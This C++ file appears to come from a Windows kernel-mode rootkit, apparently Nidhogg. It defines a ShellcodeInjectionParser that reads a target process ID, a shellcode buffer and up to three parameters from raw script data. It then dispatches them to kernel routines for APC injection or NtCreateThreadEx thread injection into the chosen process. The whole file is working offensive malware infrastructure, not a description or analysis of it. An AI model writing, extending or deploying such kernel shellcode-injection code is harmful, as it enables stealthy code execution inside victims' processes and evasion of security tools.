#include "pch.h"
#include "ShellcodeInjectionParser.h"
#include "MemoryHandler.h"
#include "ProcessHandler.h"

ShellcodeInjectionParser::ShellcodeInjectionParser() {
	this->paramsSize = nullptr;
	this->optionsSize = 2;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->paramsSize = AllocateMemory<SIZE_T*>(MAX_PARAMS * sizeof(SIZE_T));

	if (!this->paramsSize) {
		ExFreePoolWithTag(this->options, DRIVER_TAG);
		this->options = nullptr;
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}

	this->options[0] = { Options::APC, { 6, { ArgType::ULong, ArgType::VoidPtr, ArgType::ULong,
		ArgType::VoidPtr, ArgType::VoidPtr, ArgType::VoidPtr } } };
	this->options[1] = { Options::Thread, { 6, { ArgType::ULong, ArgType::VoidPtr,
		ArgType::ULong, ArgType::VoidPtr, ArgType::VoidPtr, ArgType::VoidPtr } } };
}

ShellcodeInjectionParser::~ShellcodeInjectionParser() {
	if (this->paramsSize) {
		ExFreePoolWithTag(this->paramsSize, DRIVER_TAG);
		this->paramsSize = nullptr;
	}
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS ShellcodeInjectionParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	IoctlShellcodeInfo shellcodeInfo{};
	NTSTATUS status = STATUS_SUCCESS;

	shellcodeInfo.Pid = *(ULONG*)args[0];

	if (!IsValidPid(shellcodeInfo.Pid))
		return STATUS_INVALID_PARAMETER;

	shellcodeInfo.Shellcode = args[1];
	shellcodeInfo.ShellcodeSize = (ULONG)this->paramsSize[0];

	if (args[2]) {
		shellcodeInfo.Parameter1 = args[2];
		shellcodeInfo.Parameter1Size = (ULONG)this->paramsSize[1];

		if (args[3]) {
			shellcodeInfo.Parameter2 = args[3];
			shellcodeInfo.Parameter2Size = (ULONG)this->paramsSize[2];

			if (args[4]) {
				shellcodeInfo.Parameter3 = args[4];
				shellcodeInfo.Parameter3Size = (ULONG)this->paramsSize[3];
			}
		}
	}

	switch (commandId) {
	case Options::APC:
	{
		shellcodeInfo.Type = InjectionType::APCInjection;

		if (!Features.ApcInjection) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		status = NidhoggMemoryHandler->InjectShellcodeAPC(shellcodeInfo);
		break;
	}
	case Options::Thread:
	{
		shellcodeInfo.Type = InjectionType::NtCreateThreadExInjection;

		if (!Features.CreateThreadInjection) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		status = NidhoggMemoryHandler->InjectShellcodeThread(shellcodeInfo);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	return status;
}

/*
* Description:
* ParseArgs is responsible for parsing the arguments.
*
* Parameters:
* @data		  [PUCHAR]	 -- The raw script data.
* @dataSize	  [size_t]	 -- Size if the raw script data.
* @index	  [size_t]	 -- Index to start parsing the args and command from.
* @argsNumber [USHORT]	 -- Number of arguments to run.
* @outOffset  [ULONG*]	 -- Output offset to shift the index by for the next command.
* @OutArgs    [PVOID*]	 -- Output arguments.
*
* Returns:
* @status	  [NTSTATUS] -- Whether the args are parsed or error.
*/
NTSTATUS ShellcodeInjectionParser::ParseArgs(PUCHAR data, size_t dataSize, size_t index, USHORT argsNumber, Options* commandId,
	ULONG* outOffset, PVOID OutArgs[MAX_ARGS]) {
	ULONG optionIndex = 0;
	ULONG intArg = 0;
	USHORT argIndex = 0;
	NTSTATUS status = STATUS_SUCCESS;

	// Validating the opcode size.
	if (dataSize < index)
		return STATUS_INVALID_BUFFER_SIZE;

	if (data[index] != 1)
		return STATUS_INVALID_PARAMETER;

	if (dataSize < index + 1)
		return STATUS_INVALID_BUFFER_SIZE;

	// Check the option exists for the command type.
	Options option = (Options)data[index + 1];
	status = STATUS_NOT_FOUND;

	for (optionIndex = 0; optionIndex < optionsSize; optionIndex++) {
		if (this->options[optionIndex].OptionOpcode == option) {
			status = STATUS_SUCCESS;
			break;
		}
	}

	if (!NT_SUCCESS(status))
		return status;

	*commandId = option;

	if (this->options[optionIndex].ArgMetadata.ArgsNumber != argsNumber)
		return STATUS_INVALID_PARAMETER;

	// opcode size + 1 (opcode).
	ULONG addedOffset = 2;
	PVOID currentArg = NULL;
	ULONG argSize = 0;
	ULONG currentIndex = 0;

	for (argIndex = 0; argIndex < argsNumber; argIndex++) {
		currentIndex = (ULONG)index + addedOffset + argIndex;

		if (dataSize < currentIndex) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		argSize = data[currentIndex];

		// Validating the size.
		if (argSize > dataSize - currentIndex) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		if (argIndex > 0) {
			this->paramsSize[argIndex - 1] = argSize;
		}

		currentArg = AllocateMemory<PVOID>(argSize);

		if (!currentArg) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		RtlZeroMemory(currentArg, argSize);

		__try {
			RtlCopyMemory(currentArg, &data[currentIndex + 1], argSize);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			status = STATUS_ABANDONED;
			break;
		}

		// Validating the type.
		switch (this->options[optionIndex].ArgMetadata.Types[argIndex]) {
		case ArgType::ULong:
		{
			for (DWORD j = 0, factor = pow(10, argSize - 1); j < argSize; j++, factor /= 10) {
				if (isdigit(((char*)currentArg)[j]) == 0) {
					status = STATUS_INVALID_PARAMETER;
					break;
				}
				intArg += convertDigit(((char*)currentArg)[j]) * factor;
			}
			*(ULONG*)currentArg = intArg;
			intArg = 0;
			break;
		}
		case ArgType::CharPtr:
		case ArgType::WCharPtr:
		{
			for (DWORD j = 0; j < argSize; j++) {
				if (!isChar(((char*)currentArg)[j])) {
					status = STATUS_INVALID_PARAMETER;
					break;
				}
			}
			break;
		}
		}

		if (!NT_SUCCESS(status))
			break;

		OutArgs[argIndex] = currentArg;
		addedOffset += argSize;
	}

	if (!NT_SUCCESS(status)) {
		if (currentArg)
			ExFreePoolWithTag(currentArg, DRIVER_TAG);

		if (argIndex > 0) {
			for (USHORT i = 0; i < argIndex; i++) {
				if (OutArgs[i])
					ExFreePoolWithTag(OutArgs[i], DRIVER_TAG);
			}
		}
	}

	*outOffset += addedOffset;
	return status;
}